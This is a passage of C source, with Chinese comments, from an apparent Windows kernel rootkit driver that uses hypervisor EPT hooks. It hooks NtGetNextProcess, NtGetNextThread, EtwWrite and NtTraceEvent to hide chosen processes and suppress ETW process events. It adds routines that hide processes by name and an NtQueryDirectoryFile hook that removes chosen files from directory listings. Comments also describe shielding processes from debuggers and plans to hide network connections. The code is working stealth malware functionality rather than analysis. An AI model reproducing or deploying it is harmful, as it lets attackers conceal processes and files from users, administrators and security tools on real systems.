    DbgPrint("[EPT-Hook]   NtGetNextProcess: %s\n", g_NtGetNextProcessHook ? "installed" : "pending");
    
    // 检查 Hypervisor 状态
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[EPT-Hook] ERROR: Hypervisor is not active!\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    // 检查 EPT 是否配置
    if (!g_HypervisorContext.VcpuData) {
        DbgPrint("[EPT-Hook] ERROR: VcpuData is NULL!\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        if (!vcpuData->EptTables) {
            DbgPrint("[EPT-Hook] ERROR: EPT is not configured for CPU %d!\n", cpuIndex);
            DbgPrint("[EPT-Hook] EPT Hook requires EPT to be enabled in VMCS.\n");
            DbgPrint("[EPT-Hook] Check if Secondary controls has ENABLE_EPT bit set.\n");
            return STATUS_UNSUCCESSFUL;
        }
        DbgPrint("[EPT-Hook] CPU %d: EPT tables at %p\n", cpuIndex, vcpuData->EptTables);
    }
    
    // ============================================================
    // 安装 NtQuerySystemInformation Hook (如果尚未安装)
    // ============================================================
    // 2026-06-18: NtQuerySystemInformation hook 已合并到 HvHook.c
    // (HvHook.c::HookedNtQuerySystemInformation 在 ADD_DEBUGGER 时通过 SSDT
    // 路径装载, 内含本来的 spoof 逻辑 + 调用 FilterProcessList/FilterHandleList
    // 等实现进程/句柄隐藏)。这里不再装第二个 hook 避免 0xC0000718 冲突。
    if (FALSE && g_NtQuerySystemInformationHook == NULL) {
        // 原装载逻辑已移除, 留 if(FALSE){} 块保留 funcName 变量声明的兼容性
        UNREFERENCED_PARAMETER(funcName);
        UNREFERENCED_PARAMETER(ntQuerySystemInformation);
        UNREFERENCED_PARAMETER(funcBytes);
    } else {
        DbgPrint("[EPT-Hook] NtQuerySystemInformation hook handled by HvHook (merged)\n");
    }

    // ============================================================
    // 安装 NtGetNextProcess Hook
    // ============================================================
    {
        PVOID ntGetNextProcess;
        RtlInitUnicodeString(&funcName, L"NtGetNextProcess");
        ntGetNextProcess = MmGetSystemRoutineAddress(&funcName);
        
        if (ntGetNextProcess && g_NtGetNextProcessHook == NULL) {
            DbgPrint("[EPT-Hook] NtGetNextProcess at %p\n", ntGetNextProcess);
            
            status = EptHookInstall(ntGetNextProcess, HookedNtGetNextProcess, &g_NtGetNextProcessHook);
            if (NT_SUCCESS(status)) {
                g_OriginalNtGetNextProcess = (PFN_NtGetNextProcess)EptHookGetTrampoline(g_NtGetNextProcessHook);
                DbgPrint("[EPT-Hook] NtGetNextProcess hook installed\n");
            } else {
                DbgPrint("[EPT-Hook] NtGetNextProcess hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 NtGetNextThread Hook
    // ============================================================
    {
        PVOID ntGetNextThread;
        RtlInitUnicodeString(&funcName, L"NtGetNextThread");
        ntGetNextThread = MmGetSystemRoutineAddress(&funcName);
        
        if (ntGetNextThread && g_NtGetNextThreadHook == NULL) {
            DbgPrint("[EPT-Hook] NtGetNextThread at %p\n", ntGetNextThread);
            
            status = EptHookInstall(ntGetNextThread, HookedNtGetNextThread, &g_NtGetNextThreadHook);
            if (NT_SUCCESS(status)) {
                g_OriginalNtGetNextThread = (PFN_NtGetNextThread)EptHookGetTrampoline(g_NtGetNextThreadHook);
                DbgPrint("[EPT-Hook] NtGetNextThread hook installed\n");
            } else {
                DbgPrint("[EPT-Hook] NtGetNextThread hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // NtOpenProcess Hook — 2026-06-18 已合并到 HvHook.c
    // ============================================================
    //
    // 历史: 这里曾经装 EPT 层 NtOpenProcess hook (用于隐藏列表过滤)。
    // 但 HvHook.c::HookedNtOpenProcess (用于 debugger 反向保护) 装在同一物理页,
    // 两条 hook 互相覆盖, 第二个装的会 0xC0000718 失败。
    //
    // 修复: 把"隐藏列表过滤"逻辑搬到 HvHook.c::HookedNtOpenProcess 里, 通过
    // IsProcessHiddenById (EptHook.h 暴露) 共享数据。这里不再装第二个 hook。
    //
    // 单一 hook 处理两种语义:
    //   1. target 在隐藏列表 → STATUS_INVALID_CID
    //   2. target 是 debugger + caller 是外部 → STATUS_INVALID_CID
    //   3. 其他 → 透传
    //
    // EPT NtOpenProcess hook 装载代码已禁用 (函数体保留作为参考)。
    //
    // (此处空 block)

    // ============================================================
    // 安装 ETW Hook - 过滤进程相关事件
    // ============================================================
    {
        PVOID etwWrite;
        RtlInitUnicodeString(&funcName, L"EtwWrite");
        etwWrite = MmGetSystemRoutineAddress(&funcName);
        
        if (etwWrite && g_EtwWriteHook == NULL) {
            DbgPrint("[EPT-Hook] EtwWrite at %p\n", etwWrite);
            
            status = EptHookInstall(etwWrite, HookedEtwWrite, &g_EtwWriteHook);
            if (NT_SUCCESS(status)) {
                g_OriginalEtwWrite = (PFN_EtwWrite)EptHookGetTrampoline(g_EtwWriteHook);
                DbgPrint("[EPT-Hook] EtwWrite hook installed - ETW process events will be filtered\n");
            } else {
                DbgPrint("[EPT-Hook] EtwWrite hook failed: 0x%X (ETW events not filtered)\n", status);
            }
        }
    }
    
    // 可选：Hook NtTraceEvent 作为额外保护
    {
        PVOID ntTraceEvent;
        RtlInitUnicodeString(&funcName, L"NtTraceEvent");
        ntTraceEvent = MmGetSystemRoutineAddress(&funcName);
        
        if (ntTraceEvent && g_NtTraceEventHook == NULL) {
            DbgPrint("[EPT-Hook] NtTraceEvent at %p\n", ntTraceEvent);
            
            status = EptHookInstall(ntTraceEvent, HookedNtTraceEvent, &g_NtTraceEventHook);
            if (NT_SUCCESS(status)) {
                g_OriginalNtTraceEvent = (PFN_NtTraceEvent)EptHookGetTrampoline(g_NtTraceEventHook);
                DbgPrint("[EPT-Hook] NtTraceEvent hook installed\n");
            } else {
                DbgPrint("[EPT-Hook] NtTraceEvent hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // NtDeviceIoControlFile Hook 暂时禁用 - EPT Hook 此函数导致系统不稳定
    // 网络连接隐藏需要使用其他方法（如 NDIS/WFP 过滤驱动）
    // ============================================================
    /*
    {
        PVOID ntDeviceIoControlFile;
        RtlInitUnicodeString(&funcName, L"NtDeviceIoControlFile");
        ntDeviceIoControlFile = MmGetSystemRoutineAddress(&funcName);
        
        if (ntDeviceIoControlFile && g_NtDeviceIoControlFileHook == NULL) {
            DbgPrint("[EPT-Hook] NtDeviceIoControlFile at %p\n", ntDeviceIoControlFile);
            
            status = EptHookInstall(ntDeviceIoControlFile, HookedNtDeviceIoControlFile, &g_NtDeviceIoControlFileHook);
            if (NT_SUCCESS(status)) {
                g_OriginalNtDeviceIoControlFile = (PFN_NtDeviceIoControlFile)EptHookGetTrampoline(g_NtDeviceIoControlFileHook);
                DbgPrint("[EPT-Hook] NtDeviceIoControlFile hook installed - Network connections will be filtered\n");
            } else {
                DbgPrint("[EPT-Hook] NtDeviceIoControlFile hook failed: 0x%X\n", status);
            }
        }
    }
    */
    DbgPrint("[EPT-Hook] Network connection hiding disabled - requires WFP/NDIS filter driver\n");
    
    // ============================================================
    // 底层网络驱动 Hook 暂时禁用 - 可能导致系统不稳定
    // 仅使用 NtDeviceIoControlFile EPT Hook 来过滤网络连接
    // ============================================================
    // DbgPrint("[EPT-Hook] Installing low-level network driver hooks...\n");
    // InstallNetworkDriverHooks();  // 暂时禁用，直接修改 dispatch table 不稳定
    
    DbgPrint("[EPT-Hook] ============ EptHookHideProcess END ============\n");
    DbgPrint("[EPT-Hook] Process hiding hooks summary:\n");
    DbgPrint("[EPT-Hook]   - NtQuerySystemInformation: %s\n", g_NtQuerySystemInformationHook ? "OK" : "FAILED");
    DbgPrint("[EPT-Hook]   - NtGetNextProcess: %s\n", g_NtGetNextProcessHook ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - NtGetNextThread: %s\n", g_NtGetNextThreadHook ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - NtOpenProcess: %s\n", g_NtOpenProcessHook ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - EtwWrite: %s\n", g_EtwWriteHook ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - NtTraceEvent: %s\n", g_NtTraceEventHook ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - NtDeviceIoControlFile: %s\n", g_NtDeviceIoControlFileHook ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - tcpip.sys hook: %s\n", g_TcpipDriverObject ? "OK" : "N/A");
    DbgPrint("[EPT-Hook]   - nsiproxy.sys hook: %s\n", g_NsiproxyDriverObject ? "OK" : "N/A");
    
    if (!g_NtGetNextProcessHook || !g_OriginalNtGetNextProcess) {
        DbgPrint("[EPT-Hook] Process hide not published: NtGetNextProcess core unavailable\n");
        return STATUS_DEVICE_NOT_READY;
    }
    status = EptHookAddHiddenProcessState(ProcessId);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    return EptHookIsProcessHidden(ProcessId)
        ? STATUS_SUCCESS
        : STATUS_DEVICE_NOT_READY;
}

/*
 * 根据进程名隐藏进程
 * 通过枚举系统进程找到匹配的进程ID，然后调用 EptHookHideProcess
 */
NTSTATUS
EptHookHideProcessByName(
    _In_ PCWSTR ProcessName
)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;  // 初始 64KB
    ULONG returnLength = 0;
    PSYSTEM_PROCESS_INFORMATION_ENTRY current;
    ULONG foundCount = 0;
    UNICODE_STRING targetName;
    
    DbgPrint("[EPT-Hook] ============ EptHookHideProcessByName START ============\n");
    DbgPrint("[EPT-Hook] Request to hide process: %ws\n", ProcessName ? ProcessName : L"(null)");
    
    if (!ProcessName || ProcessName[0] == L'\0') {
        DbgPrint("[EPT-Hook] Invalid process name\n");
        return STATUS_INVALID_PARAMETER;
    }
    
    // 初始化目标进程名
    RtlInitUnicodeString(&targetName, ProcessName);
    
    // 分配缓冲区查询进程信息
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, 'kpEH');
        if (!buffer) {
            DbgPrint("[EPT-Hook] Failed to allocate buffer for process enumeration\n");
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 不能直接调 ZwQuerySystemInformation —— 我们自己 hook 了它,
        // 直接调会触发隐藏过滤,导致 hide-by-name 也看不到目标进程而失败。
        // 通过 trampoline 跳过 hook 入口,拿到真实的进程列表。
        status = g_OriginalNtQuerySystemInformation
            ? g_OriginalNtQuerySystemInformation(5, buffer, bufferSize, &returnLength)
            : ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);
        
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, 'kpEH');
            buffer = NULL;
            bufferSize = returnLength + 0x1000;  // 加一些余量
            if (bufferSize > 0x1000000) {  // 最大 16MB
                DbgPrint("[EPT-Hook] Buffer size too large\n");
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            DbgPrint("[EPT-Hook] ZwQuerySystemInformation failed: 0x%X\n", status);
            ExFreePoolWithTag(buffer, 'kpEH');
            return status;
        }
        
        break;
    }
    
    // 遍历进程列表，查找匹配的进程名
    __try {
        current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)buffer;
        
        while (TRUE) {
            // 检查进程名是否匹配（不区分大小写）
            if (current->ImageName.Buffer != NULL && 
                current->ImageName.Length > 0) {
                
                if (RtlCompareUnicodeString(&current->ImageName, &targetName, TRUE) == 0) {
                    ULONG processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                    
                    DbgPrint("[EPT-Hook] Found process: %wZ (PID=%d)\n", 
                        &current->ImageName, processId);
                    
                    // 调用 EptHookHideProcess 隐藏该进程
                    status = EptHookHideProcess(processId);
                    if (NT_SUCCESS(status)) {
                        foundCount++;
                        DbgPrint("[EPT-Hook] Successfully hidden PID %d\n", processId);
                    } else {
                        DbgPrint("[EPT-Hook] Failed to hide PID %d: 0x%X\n", processId, status);
                    }
                }
            }
            
            // 移动到下一个条目
            if (current->NextEntryOffset == 0) {
                break;
            }
            current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[EPT-Hook] Exception while enumerating processes: 0x%X\n", GetExceptionCode());
    }
    
    // 释放缓冲区
    if (buffer) {
        ExFreePoolWithTag(buffer, 'kpEH');
    }
    
    if (foundCount == 0) {
        DbgPrint("[EPT-Hook] No process found with name: %ws\n", ProcessName);
        DbgPrint("[EPT-Hook] ============ EptHookHideProcessByName END ============\n");
        return STATUS_NOT_FOUND;
    }
    
    DbgPrint("[EPT-Hook] Hidden %d process(es) with name: %ws\n", foundCount, ProcessName);
    DbgPrint("[EPT-Hook] ============ EptHookHideProcessByName END ============\n");
    
    return STATUS_SUCCESS;
}

/*
 * 取消隐藏指定进程名
 * 通过枚举系统进程找到匹配的进程ID，然后调用 EptHookUnhideProcess
 */
NTSTATUS
EptHookUnhideProcessByName(
    _In_ PCWSTR ProcessName
)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;
    ULONG returnLength = 0;
    PSYSTEM_PROCESS_INFORMATION_ENTRY current;
    ULONG foundCount = 0;
    UNICODE_STRING targetName;
    
    DbgPrint("[EPT-Hook] Request to unhide process: %ws\n", ProcessName ? ProcessName : L"(null)");
    
    if (!ProcessName || ProcessName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlInitUnicodeString(&targetName, ProcessName);
    
    // 分配缓冲区查询进程信息
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, 'kpEH');
        if (!buffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 走 trampoline,绕开自己装的 hook —— 否则 unhide-by-name 永远 NOT_FOUND
        status = g_OriginalNtQuerySystemInformation
            ? g_OriginalNtQuerySystemInformation(5, buffer, bufferSize, &returnLength)
            : ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);
        
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, 'kpEH');
            buffer = NULL;
            bufferSize = returnLength + 0x1000;
            if (bufferSize > 0x1000000) {
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            HvFreePoolNonNull(buffer, 'kpEH');
            return status;
        }
        break;
    }
    
    // 遍历进程列表
    __try {
        current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)buffer;
        
        while (TRUE) {
            if (current->ImageName.Buffer != NULL && 
                current->ImageName.Length > 0 &&
                RtlCompareUnicodeString(&current->ImageName, &targetName, TRUE) == 0) {
                
                ULONG processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                
                status = EptHookUnhideProcess(processId);
                if (NT_SUCCESS(status)) {
                    foundCount++;
                    DbgPrint("[EPT-Hook] Unhidden PID %d\n", processId);
                }
            }
            
            if (current->NextEntryOffset == 0) break;
            current = (PSYSTEM_PROCESS_INFORMATION_ENTRY)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[EPT-Hook] Exception in EptHookUnhideProcessByName\n");
    }
    
    if (buffer) {
        ExFreePoolWithTag(buffer, 'kpEH');
    }
    
    if (foundCount == 0) {
        DbgPrint("[EPT-Hook] No process found with name: %ws\n", ProcessName);
        return STATUS_NOT_FOUND;
    }
    
    DbgPrint("[EPT-Hook] Unhidden %d process(es) with name: %ws\n", foundCount, ProcessName);
    return STATUS_SUCCESS;
}

/*
 * 取消隐藏指定进程ID
 */
NTSTATUS
EptHookRemoveHiddenProcessState(
    _In_ ULONG ProcessId
)
{
    KIRQL oldIrql;
    ULONG i;
    BOOLEAN found = FALSE;
    
    DbgPrint("[EPT-Hook] Request to unhide PID: %d\n", ProcessId);
    
    if (ProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > DISPATCH_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    
    KeAcquireSpinLock(&g_HiddenProcessLock, &oldIrql);
    
    // 查找并移除
    for (i = 0; i < g_HiddenProcessCount && i < MAX_HIDDEN_PROCESSES; i++) {
        if (g_HiddenProcessIds[i] == ProcessId) {
            // 找到了，将后面的元素前移
            ULONG j;
            for (j = i; j < g_HiddenProcessCount - 1 && j < MAX_HIDDEN_PROCESSES - 1; j++) {
                g_HiddenProcessIds[j] = g_HiddenProcessIds[j + 1];
            }
            // 清空最后一个
            g_HiddenProcessIds[g_HiddenProcessCount - 1] = 0;
            g_HiddenProcessCount--;
            found = TRUE;
            DbgPrint("[EPT-Hook] Removed hidden PID: %d, count=%d\n", 
                ProcessId, g_HiddenProcessCount);
            break;
        }
    }
    
    KeReleaseSpinLock(&g_HiddenProcessLock, oldIrql);
    
    if (!found) {
        DbgPrint("[EPT-Hook] PID not found in list: %d\n", ProcessId);
        return STATUS_NOT_FOUND;
    }
    
    return STATUS_SUCCESS;
}

NTSTATUS
EptHookUnhideProcess(
    _In_ ULONG ProcessId
)
{
    return EptHookRemoveHiddenProcessState(ProcessId);
}

// ============================================================
// 高级功能：文件隐藏
// ============================================================

// 注意: g_HiddenFile* 变量已在文件开头定义

// NtQueryDirectoryFile Hook 相关
static PEPT_HOOK_ENTRY g_NtQueryDirectoryFileHook = NULL;

// 原始函数类型
typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan
);

static PFN_NtQueryDirectoryFile g_OriginalNtQueryDirectoryFile = NULL;

// 文件信息结构定义
typedef struct _FILE_DIRECTORY_INFO_EPT {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFO_EPT, *PFILE_DIRECTORY_INFO_EPT;

typedef struct _FILE_BOTH_DIR_INFO_EPT {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFO_EPT, *PFILE_BOTH_DIR_INFO_EPT;

typedef struct _FILE_FULL_DIR_INFO_EPT {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFO_EPT, *PFILE_FULL_DIR_INFO_EPT;

typedef struct _FILE_NAMES_INFO_EPT {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFO_EPT, *PFILE_NAMES_INFO_EPT;

typedef struct _FILE_ID_BOTH_DIR_INFO_EPT {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFO_EPT, *PFILE_ID_BOTH_DIR_INFO_EPT;

typedef struct _FILE_ID_FULL_DIR_INFO_EPT {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFO_EPT, *PFILE_ID_FULL_DIR_INFO_EPT;

/*
 * 检查文件名是否在隐藏列表中
 */
static BOOLEAN
EptIsFileNameHidden(
    _In_ PCWSTR FileName,
    _In_ ULONG FileNameLength
)
{
    ULONG i;
    WCHAR tempName[MAX_FILE_NAME_LEN];
    ULONG charCount;
    KIRQL oldIrql;
    BOOLEAN result = FALSE;
    
    if (!FileName || FileNameLength == 0 || g_HiddenFileCount == 0) {
        return FALSE;
    }
    
    // 复制并添加 null 终止符
    charCount = FileNameLength / sizeof(WCHAR);
    if (charCount >= MAX_FILE_NAME_LEN) {
        charCount = MAX_FILE_NAME_LEN - 1;
    }
    
    RtlCopyMemory(tempName, FileName, charCount * sizeof(WCHAR));
    tempName[charCount] = L'\0';
    
    // 检查隐藏列表
    if (g_HiddenFileLockInitialized) {
        KeAcquireSpinLock(&g_HiddenFileLock, &oldIrql);
    }
    
    for (i = 0; i < g_HiddenFileCount && i < MAX_HIDDEN_FILES_EPT; i++) {
        if (_wcsicmp(g_HiddenFileNames[i], tempName) == 0) {
            result = TRUE;
            break;
        }
    }
    
    if (g_HiddenFileLockInitialized) {
        KeReleaseSpinLock(&g_HiddenFileLock, oldIrql);
    }
    
    return result;
}

/*
 * 从目录枚举结果中过滤隐藏文件
 */
static VOID
EptFilterDirectoryInfo(
    _In_ PVOID FileInfo,
    _In_ FILE_INFORMATION_CLASS InfoClass
)
{
    PVOID current = FileInfo;
    PVOID previous = NULL;
    ULONG nextOffset;
    PWCHAR fileName;
    ULONG fileNameLength;
    
    if (!FileInfo || g_HiddenFileCount == 0) {
        return;
    }
    
    __try {
        while (current) {
            BOOLEAN shouldHide = FALSE;
            
            // 根据信息类提取文件名
            switch (InfoClass) {
                case FileDirectoryInformation:
                    nextOffset = ((PFILE_DIRECTORY_INFO_EPT)current)->NextEntryOffset;
                    fileName = ((PFILE_DIRECTORY_INFO_EPT)current)->FileName;
                    fileNameLength = ((PFILE_DIRECTORY_INFO_EPT)current)->FileNameLength;
                    break;
                    
                case FileFullDirectoryInformation:
                    nextOffset = ((PFILE_FULL_DIR_INFO_EPT)current)->NextEntryOffset;
                    fileName = ((PFILE_FULL_DIR_INFO_EPT)current)->FileName;
                    fileNameLength = ((PFILE_FULL_DIR_INFO_EPT)current)->FileNameLength;
                    break;
                    
                case FileBothDirectoryInformation:
                    nextOffset = ((PFILE_BOTH_DIR_INFO_EPT)current)->NextEntryOffset;
                    fileName = ((PFILE_BOTH_DIR_INFO_EPT)current)->FileName;
                    fileNameLength = ((PFILE_BOTH_DIR_INFO_EPT)current)->FileNameLength;
                    break;
                    
                case FileNamesInformation:
                    nextOffset = ((PFILE_NAMES_INFO_EPT)current)->NextEntryOffset;
                    fileName = ((PFILE_NAMES_INFO_EPT)current)->FileName;
                    fileNameLength = ((PFILE_NAMES_INFO_EPT)current)->FileNameLength;
                    break;
                    
                case FileIdBothDirectoryInformation:
                    nextOffset = ((PFILE_ID_BOTH_DIR_INFO_EPT)current)->NextEntryOffset;
                    fileName = ((PFILE_ID_BOTH_DIR_INFO_EPT)current)->FileName;
                    fileNameLength = ((PFILE_ID_BOTH_DIR_INFO_EPT)current)->FileNameLength;
                    break;
                    
                case FileIdFullDirectoryInformation:
                    nextOffset = ((PFILE_ID_FULL_DIR_INFO_EPT)current)->NextEntryOffset;
                    fileName = ((PFILE_ID_FULL_DIR_INFO_EPT)current)->FileName;
                    fileNameLength = ((PFILE_ID_FULL_DIR_INFO_EPT)current)->FileNameLength;
                    break;
                    
                default:
                    return;
            }
            
            // 检查是否需要隐藏
            shouldHide = EptIsFileNameHidden(fileName, fileNameLength);
            
            if (shouldHide) {
                // 从列表中移除此条目
                if (previous) {
                    // 调整前一个条目的偏移
                    ULONG* prevNextOffset = NULL;
                    
                    switch (InfoClass) {
                        case FileDirectoryInformation:
                            prevNextOffset = &((PFILE_DIRECTORY_INFO_EPT)previous)->NextEntryOffset;
                            break;
                        case FileFullDirectoryInformation:
                            prevNextOffset = &((PFILE_FULL_DIR_INFO_EPT)previous)->NextEntryOffset;
                            break;
                        case FileBothDirectoryInformation:
                            prevNextOffset = &((PFILE_BOTH_DIR_INFO_EPT)previous)->NextEntryOffset;
                            break;
                        case FileNamesInformation:
                            prevNextOffset = &((PFILE_NAMES_INFO_EPT)previous)->NextEntryOffset;
                            break;
                        case FileIdBothDirectoryInformation:
                            prevNextOffset = &((PFILE_ID_BOTH_DIR_INFO_EPT)previous)->NextEntryOffset;
                            break;
                        case FileIdFullDirectoryInformation:
                            prevNextOffset = &((PFILE_ID_FULL_DIR_INFO_EPT)previous)->NextEntryOffset;
                            break;
                    }
                    
                    if (prevNextOffset) {
                        if (nextOffset == 0) {
                            *prevNextOffset = 0;
                        } else {
                            *prevNextOffset += nextOffset;
                        }
                    }
                    
                    // 不更新 previous，移动到下一个
                    if (nextOffset == 0) {
                        break;
                    }
                    current = (PUCHAR)current + nextOffset;
                    continue;
                }
            }
            
            // 正常移动到下一个
            previous = current;
            if (nextOffset == 0) {
                break;
            }
            current = (PUCHAR)current + nextOffset;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常
    }
}

/*
 * Hooked NtQueryDirectoryFile 
 */
NTSTATUS
NTAPI
EptHookedNtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan
)
{
    EPT_DIRECT_CALLBACK_BEGIN(g_NtQueryDirectoryFileHook)
    NTSTATUS status;
    PFN_NtQueryDirectoryFile originalFunc;
    
    // 获取原始函数
    originalFunc = g_OriginalNtQueryDirectoryFile;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 调用原始函数
    __try {
        status = originalFunc(
            FileHandle,
            Event,
            ApcRoutine,
            ApcContext,
            IoStatusBlock,
            FileInformation,
            Length,
            FileInformationClass,
            ReturnSingleEntry,
            FileName,
            RestartScan
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    // 如果成功且有隐藏文件，过滤结果
    if (NT_SUCCESS(status) && FileInformation && g_HiddenFileCount > 0) {
        EptFilterDirectoryInfo(FileInformation, FileInformationClass);
    }
    
    return status;
    EPT_DIRECT_CALLBACK_END()
}

/*
 * 添加文件到隐藏列表
 */
NTSTATUS
EptHookHideFile(
    _In_ PCWSTR FileName
)
{
    KIRQL oldIrql;
    PCWSTR baseName;
    SIZE_T len;
    
    if (!FileName) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 检查锁是否已初始化（应该在 EptHookInitialize 中已初始化）
    if (!g_HiddenFileLockInitialized) {
        DbgPrint("[EPT-Hook] Warning: File hide lock not initialized, call EptHookInitialize first\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    // 提取文件名（去除路径）
    baseName = wcsrchr(FileName, L'\\');
    if (baseName) {
        baseName++;
    } else {
        baseName = FileName;
    }
    
    len = wcslen(baseName);
    if (len == 0 || len >= MAX_FILE_NAME_LEN) {
        return STATUS_INVALID_PARAMETER;
    }
    
    DbgPrint("[EPT-Hook] Adding file to hidden list: %ws\n", baseName);
    
    KeAcquireSpinLock(&g_HiddenFileLock, &oldIrql);
    
    // 检查是否已存在
    for (ULONG i = 0; i < g_HiddenFileCount && i < MAX_HIDDEN_FILES_EPT; i++) {
        if (_wcsicmp(g_HiddenFileNames[i], baseName) == 0) {
            KeReleaseSpinLock(&g_HiddenFileLock, oldIrql);
            DbgPrint("[EPT-Hook] File already in hidden list\n");
            return STATUS_SUCCESS;
        }
    }
    
    // 添加到列表
    if (g_HiddenFileCount < MAX_HIDDEN_FILES_EPT) {
        wcscpy_s(g_HiddenFileNames[g_HiddenFileCount], MAX_FILE_NAME_LEN, baseName);
        g_HiddenFileCount++;
        KeReleaseSpinLock(&g_HiddenFileLock, oldIrql);
        DbgPrint("[EPT-Hook] File added, count=%d\n", g_HiddenFileCount);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_HiddenFileLock, oldIrql);
    DbgPrint("[EPT-Hook] Hidden file list full\n");
    return STATUS_INSUFFICIENT_RESOURCES;
}

/*
 * 从隐藏列表移除文件
 */
NTSTATUS
EptHookUnhideFile(
